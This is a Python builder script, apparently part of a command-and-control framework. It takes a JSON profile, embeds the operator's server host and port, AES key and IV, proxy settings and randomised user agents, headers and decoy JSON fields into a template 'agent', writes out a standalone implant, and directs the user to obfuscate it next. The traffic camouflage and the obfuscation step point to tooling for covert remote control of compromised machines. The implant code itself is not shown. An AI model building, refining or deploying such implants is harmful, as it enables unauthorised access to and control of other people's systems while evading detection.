import sys
import json
import os
from datetime import datetime, timezone
import ast  # For safe literal evaluation if needed
import random
import math
import base64
import secrets
import argparse
from pathlib import Path

def _resolve_default_paths():
    """Resolve default important paths relative to this script."""
    script_dir = Path(__file__).resolve().parent
    server_dir = script_dir
    root_dir = server_dir.parent
    default_profile = server_dir / 'profiles' / 'default.json'
    template_agent = root_dir / 'agent' / 'agent.py'
    agents_out_dir = server_dir / 'agents'
    return {
        'server_dir': server_dir,
        'root_dir': root_dir,
        'default_profile': default_profile,
        'template_agent': template_agent,
        'agents_out_dir': agents_out_dir,
    }


def _build_parser(defaults):
    parser = argparse.ArgumentParser(
        prog='agent_create.py',
        description=(
            'Create a standalone agent by embedding values from a profile into the\n'
            'development template agent (../agent/agent.py). Outputs into agents/.'
        ),
        epilog=(
            'Typical workflow:\n'
            '  1) python3 agent_create.py --profile server/profiles/default.json\n'
            '  2) python3 agent_obfuscate.py <path-to-created-agent>\n\n'
            'Notes:\n'
            '- Run from the server directory for convenience.\n'
            '- The development template is agent/agent.py one level up from server/.\n'
            '- Generated agents are saved under server/agents/.\n'
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument(
        '-p', '--profile',
        default=str(defaults['default_profile']),
        help=f'Path to profile JSON (default: {defaults["default_profile"]})'
    )
    parser.add_argument(
        '-t', '--template',
        default=str(defaults['template_agent']),
        help=f'Path to template agent.py (default: {defaults["template_agent"]})'
    )
    parser.add_argument(
        '-o', '--output-dir',
        default='agents',
        help='Output directory for created agent (default: agents)'
    )
    parser.add_argument(
        '-v', '--verbose', action='store_true', help='Enable verbose logging'
    )
    # Required server connection details
    parser.add_argument(
        '-H', '--server-host',
        required=True,
        help='Server hostname or IP (required)'
    )
    parser.add_argument(
        '-P', '--server-port',
        required=True,
        type=int,
        help='Server port (required)'
    )
    # Scheme toggle: default https; use -http to switch to http
    parser.add_argument(
        '-http',
        dest='use_http',
        action='store_true',
        help='Use http instead of default https'
    )
    return parser


def main():
    defaults = _resolve_default_paths()
    parser = _build_parser(defaults)
    args = parser.parse_args()

    profile_path = args.profile
    
    # Load profile
    if args.verbose:
        print(f"[agent_create] Loading profile: {profile_path}")
    with open(profile_path, 'r') as f:
        profile = json.load(f)
    agent_cfg = profile['agent']
    config = profile['config']

    # Update server connection details in profile (server_host, server_port, server_scheme)
    scheme = 'http' if args.use_http else 'https'
    if args.verbose:
        print(f"[agent_create] Setting agent.server_host={args.server_host}")
        print(f"[agent_create] Setting agent.server_port={args.server_port}")
        print(f"[agent_create] Setting agent.server_scheme={scheme}")
    agent_cfg['server_host'] = args.server_host
    agent_cfg['server_port'] = int(args.server_port)
    agent_cfg['server_scheme'] = scheme

    # Persist the updated profile back to disk
    with open(profile_path, 'w') as f:
        json.dump(profile, f, indent=2)
    if args.verbose:
        print(f"[agent_create] Wrote updated profile: {profile_path}")
    
    # Compute values
    aes_key = repr(config['aes_key'])
    aes_iv = repr(config['aes_iv'])
    debug = repr(agent_cfg['debug'])
    server_host = repr(agent_cfg['server_host'])
    server_port = repr(agent_cfg['server_port'])
    server_scheme = repr(agent_cfg['server_scheme'])
    proxy_host = repr(agent_cfg['proxy_host'])
    proxy_port = repr(agent_cfg['proxy_port'])
    use_proxy = repr(agent_cfg['use_proxy'])
    
    array_api_base_paths = repr(agent_cfg['agent_api_base_paths'])
    array_uri_endpoints = repr(agent_cfg['uri_endpoints'])
    array_data_field_names = repr(agent_cfg['data_field_names'])
    array_user_agents = repr(agent_cfg['user_agents'])
    array_random_headers = repr(agent_cfg['random_headers'])
    
    min_random_json_attrs = repr(agent_cfg.get('min_random_json_attributes', 3))
    max_random_json_attrs = repr(agent_cfg.get('max_random_json_attributes', 7))
    
    # For random_json_attributes, we'll hardcode the list and the reconstruction code will stay
    random_json_attributes = repr(agent_cfg['random_json_attributes'])
    
    # Read original agent.py
    original_path = args.template
    if args.verbose:
        print(f"[agent_create] Using template: {original_path}")
    with open(original_path, 'r') as f:
        code = f.read()
    
    # Replace the loading section
    # Find the loading block and replace with hardcoded assignments
    load_block_start = code.find("PROFILE_PATH =")
    load_block_end = code.find("def FUNC_get_random_api_base_path():")
    
    hardcoded = """
VAR_AES_KEY = {aes_key}
VAR_AES_IV = {aes_iv}
VAR_DEBUG = {debug}
VAR_SERVER_HOST = {server_host}
VAR_SERVER_PORT = {server_port}
VAR_SERVER_SCHEME = {server_scheme}
VAR_PROXY_HOST = {proxy_host}
VAR_PROXY_PORT = {proxy_port}
VAR_USE_PROXY = {use_proxy}

ARRAY_API_BASE_PATHS = {array_api_base_paths}
ARRAY_URI_ENDPOINTS = {array_uri_endpoints}
ARRAY_DATA_FIELD_NAMES = {array_data_field_names}
ARRAY_USER_AGENTS = {array_user_agents}
ARRAY_RANDOM_HEADERS = {array_random_headers}

VAR_MIN_RANDOM_JSON_ATTRS = {min_random_json_attrs}
VAR_MAX_RANDOM_JSON_ATTRS = {max_random_json_attrs}

# Hardcoded random_json_attributes list
VAR_random_json_attributes = {random_json_attributes}

# Reconstruct ARRAY_RANDOM_JSON_ATTRIBUTES from hardcoded list
ARRAY_RANDOM_JSON_ATTRIBUTES = []
def FUNC_create_generator(gen):
    VAR_typ = gen['type']
    if VAR_typ == 'uniform':
        VAR_minv, VAR_maxv = gen['min'], gen['max']
        VAR_rnd = gen.get('round')
        if VAR_rnd is not None:
            return lambda: round(random.uniform(VAR_minv, VAR_maxv), VAR_rnd)
        return lambda: random.uniform(VAR_minv, VAR_maxv)
    elif VAR_typ == 'randint':
        return lambda: random.randint(gen['min'], gen['max'])
    elif VAR_typ == 'choice':
        VAR_opts = gen['options']
        return lambda: random.choice(VAR_opts)
    elif VAR_typ == 'datetime_utc':
        return lambda: datetime.now(timezone.utc).isoformat()
    elif VAR_typ == 'str_randint':
        return lambda: str(random.randint(gen['min'], gen['max']))
    elif VAR_typ == 'template':
        VAR_template = gen['template']
        VAR_vars_gen = {{k: FUNC_create_generator(v) for k, v in gen.items() if k not in ['type', 'template']}}
        return lambda: VAR_template.format(**{{k: v() for k, v in VAR_vars_gen.items()}})
    elif VAR_typ == 'base64_random':
        VAR_min_len = gen.get('min_length', 20)
        VAR_max_len = gen.get('max_length', 50)
        VAR_min_bytes = math.ceil(VAR_min_len * 3 / 4)
        VAR_max_bytes = math.floor(VAR_max_len * 3 / 4) - 1
        VAR_max_bytes = max(VAR_min_bytes, VAR_max_bytes)
        return lambda: base64.b64encode(secrets.token_bytes(random.randint(VAR_min_bytes, VAR_max_bytes))).decode('utf-8')
    raise ValueError(f"Unknown generator type: {{VAR_typ}}")

for VAR_attr in VAR_random_json_attributes:
    ARRAY_RANDOM_JSON_ATTRIBUTES.append((VAR_attr['name'], FUNC_create_generator(VAR_attr['generator'])))
""".format(
        aes_key=aes_key, aes_iv=aes_iv, debug=debug, server_host=server_host,
        server_port=server_port, server_scheme=server_scheme, proxy_host=proxy_host,
        proxy_port=proxy_port, use_proxy=use_proxy, array_api_base_paths=array_api_base_paths,
        array_uri_endpoints=array_uri_endpoints, array_data_field_names=array_data_field_names,
        array_user_agents=array_user_agents, array_random_headers=array_random_headers,
        min_random_json_attrs=min_random_json_attrs, max_random_json_attrs=max_random_json_attrs,
        random_json_attributes=random_json_attributes
    )
    
    code = code[:load_block_start] + hardcoded + code[load_block_end:]
    
    # Remove the PROFILE_PATH and with open block if still there
    code = code.replace("PROFILE_PATH = '../server/profiles/default.json'", "")
    code = code.replace("with open(PROFILE_PATH, 'r') as f:\n    profile = json.load(f)\nagent_cfg = profile['agent']\nconfig = profile['config']", "")
    
    # Create agents dir
    agents_dir = args.output_dir
    os.makedirs(agents_dir, exist_ok=True)
    
    # Output file with timestamp
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_path = os.path.join(agents_dir, f'agent_{timestamp}.py')
    with open(output_path, 'w') as f:
        f.write(code)

    print("Standalone agent created:")
    print(f"  - Output: {output_path}")
    print(f"  - Profile: {profile_path}")
    print(f"  - Template: {original_path}")
    print("Next: Obfuscate with -> python3 agent_obfuscate.py", output_path)

if __name__ == '__main__':
    main()